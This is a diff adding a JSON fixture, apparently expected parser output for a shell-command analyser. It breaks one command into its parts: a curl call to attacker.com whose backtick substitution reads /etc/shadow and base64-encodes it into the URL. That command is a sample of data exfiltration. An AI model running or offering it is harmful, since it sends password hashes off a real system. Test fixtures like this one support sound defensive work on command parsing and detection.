@@ -1,0 +1,49 @@
+[
+  {
+    "argv": [
+      "curl",
+      "https://attacker.com/k=`cat /etc/shadow | base64 -w0`"
+    ],
+    "original": [
+      "curl",
+      "https://attacker.com/k=`cat /etc/shadow | base64 -w0`"
+    ],
+    "terminator": "NEWLINE",
+    "subst": [
+      {
+        "kind": "backtick",
+        "raw_body": "cat /etc/shadow | base64 -w0",
+        "parsed": [
+          {
+            "argv": [
+              "cat",
+              "/etc/shadow"
+            ],
+            "original": [
+              "cat",
+              "/etc/shadow"
+            ],
+            "terminator": "PIPE",
+            "depth": 1,
+            "origin": "backtick"
+          },
+          {
+            "argv": [
+              "base64",
+              "-w0"
+            ],
+            "original": [
+              "base64",
+              "-w0"
+            ],
+            "terminator": "NEWLINE",
+            "depth": 1,
+            "origin": "backtick"
+          }
+        ]
+      }
+    ],
+    "depth": 0,
+    "origin": "top"
+  }
+]
